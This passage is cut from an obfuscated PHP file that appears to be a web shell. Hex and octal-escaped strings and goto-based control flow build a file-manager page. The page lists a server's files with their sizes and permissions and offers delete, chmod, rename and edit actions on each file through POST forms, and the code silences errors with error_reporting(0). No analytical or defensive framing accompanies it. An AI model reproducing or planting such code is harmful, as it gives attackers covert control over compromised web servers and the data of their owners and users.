42\40\x76\x61\x6c\x75\x65\75\42\x64\151\162\x22\76\12\x3c\151\x6e\160\x75\164\40\164\x79\x70\x65\x3d\42\150\x69\x64\x64\x65\156\42\x20\x6e\141\155\145\x3d\42\156\141\155\145\42\x20\x76\141\x6c\165\145\x3d\42{$dir}\x22\x3e\12\x3c\x69\x6e\160\x75\164\x20\164\171\160\x65\x3d\42\x68\151\x64\144\145\x6e\x22\40\x6e\141\x6d\145\75\42\160\x61\164\x68\x22\x20\166\141\154\165\145\x3d\x22{$path}\57{$dir}\x22\x3e\xa\x3c\151\x6e\x70\x75\164\x20\x74\x79\x70\145\x3d\x22\x73\165\x62\155\x69\x74\42\x20\166\141\x6c\165\145\x3d\x22\x3e\42\x20\x2f\x3e\12\x3c\x2f\146\x6f\162\x6d\x3e\74\57\x63\145\156\x74\x65\x72\x3e\x3c\x2f\164\x64\76\12\x3c\x2f\164\x72\x3e"; } echo "\x3c\x74\162\x20\143\x6c\x61\x73\x73\75\x22\146\151\162\x73\x74\x22\x3e\x3c\x74\144\76\74\57\164\x64\x3e\x3c\x74\144\76\x3c\x2f\164\x64\76\x3c\x74\144\x3e\74\x2f\x74\144\76\x3c\164\144\x3e\74\57\x74\144\x3e\74\x2f\164\x72\76"; foreach ($scandir as $file) { if (!is_file("{$path}\57{$file}")) { continue; } $size = filesize("{$path}\57{$file}") / 1024; $size = round($size, 3); if ($size >= 1024) { $size = round($size / 1024, 2) . "\40\x4d\x42"; } else { $size = $size . "\x20\113\102"; } echo "\x3c\x74\162\76\xa\74\x74\x64\76\74\141\40\x68\162\145\x66\x3d\42\x3f\146\x69\154\x65\163\162\143\x3d{$path}\57{$file}\46\160\141\164\x68\75{$path}\42\76{$file}\74\x2f\141\76\x3c\57\164\144\x3e\12\74\x74\144\76\74\x63\145\x6e\164\x65\x72\76" . $size . "\74\57\143\145\x6e\x74\x65\162\x3e\74\x2f\x74\144\76\xa\74\x74\x64\x3e\74\143\145\x6e\x74\x65\162\76"; if (is_writable("{$path}\x2f{$file}")) { echo "\74\x66\157\156\x74\40\143\x6f\x6c\157\x72\x3d\42\143\x79\x61\156\42\76"; } elseif (!is_readable("{$path}\x2f{$file}")) { echo "\x3c\x66\157\x6e\x74\x20\x63\157\154\157\162\x3d\x22\162\145\144\x22\x3e"; } echo perms("{$path}\x2f{$file}"); if (is_writable("{$path}\x2f{$file}") || !is_readable("{$path}\57{$file}")) { echo "\x3c\x2f\x66\157\156\164\x3e"; } echo "\74\x2f\x63\145\x6e\164\x65\162\x3e\x3c\x2f\x74\x64\76\12\74\164\x64\x3e\74\x63\145\156\x74\145\162\x3e\74\x66\x6f\162\155\x20\155\x65\x74\x68\x6f\x64\75\x22\120\117\x53\124\42\40\x61\x63\164\x69\157\156\x3d\42\77\157\x70\164\x69\157\x6e\46\x70\x61\164\150\75{$path}\42\76\xa\74\163\x65\x6c\145\143\x74\40\156\141\155\145\75\42\157\x70\x74\42\x3e\xa\x3c\x6f\160\164\151\x6f\x6e\x20\x76\141\x6c\x75\145\75\42\x22\x3e\x3c\57\x6f\x70\164\151\157\x6e\76\xa\74\x6f\160\164\151\x6f\156\40\166\141\154\x75\145\x3d\42\x64\145\154\x65\x74\x65\x22\76\x44\x65\x6c\x65\164\145\x3c\x2f\157\160\x74\151\157\x6e\x3e\12\74\157\160\x74\151\157\x6e\x20\166\x61\x6c\x75\145\x3d\x22\x63\150\x6d\x6f\x64\x22\x3e\103\x68\155\x6f\x64\74\57\x6f\x70\164\151\x6f\156\76\xa\74\x6f\x70\x74\151\x6f\156\x20\166\x61\154\165\x65\x3d\x22\162\145\156\141\x6d\x65\42\x3e\122\x65\x6e\x61\x6d\x65\x3c\57\x6f\x70\x74\x69\x6f\156\x3e\12\74\x6f\160\164\151\157\x6e\40\166\141\154\x75\145\x3d\42\145\144\151\164\42\x3e\105\x64\x69\x74\x3c\57\x6f\x70\x74\151\x6f\x6e\x3e\xa\74\x2f\163\145\154\145\x63\x74\x3e\xa\74\x69\x6e\x70\165\x74\x20\164\171\160\x65\x3d\x22\150\151\144\x64\145\x6e\x22\40\x6e\x61\155\x65\75\42\164\x79\160\145\42\x20\x76\x61\x6c\165\x65\75\42\x66\x69\x6c\x65\x22\76\xa\74\151\x6e\160\x75\x74\x20\164\x79\160\145\75\x22\x68\151\x64\x64\x65\156\x22\40\156\141\x6d\x65\x3d\42\x6e\x61\155\145\x22\40\166\141\154\x75\x65\75\x22{$file}\42\76\xa\74\151\x6e\x70\x75\164\40\164\171\x70\145\75\42\150\x69\144\144\x65\x6e\42\x20\156\x61\x6d\145\75\42\x70\x61\x74\150\42\x20\166\141\x6c\165\145\x3d\x22{$path}\57{$file}\42\76\12\74\x69\156\x70\x75\x74\x20\164\171\160\145\75\42\x73\x75\142\155\x69\x74\42\x20\x76\x61\x6c\x75\x65\x3d\42\x3e\42\40\57\76\xa\x3c\x2f\146\157\x72\155\76\74\x2f\143\x65\156\164\145\x72\76\x3c\57\164\x64\76\xa\74\x2f\164\x72\x3e"; } echo "\x3c\57\164\141\x62\154\145\76\12\74\x2f\144\x69\x76\76"; } goto w6e4m; ZREjR: error_reporting(0); goto riI52; xq_qC: ?>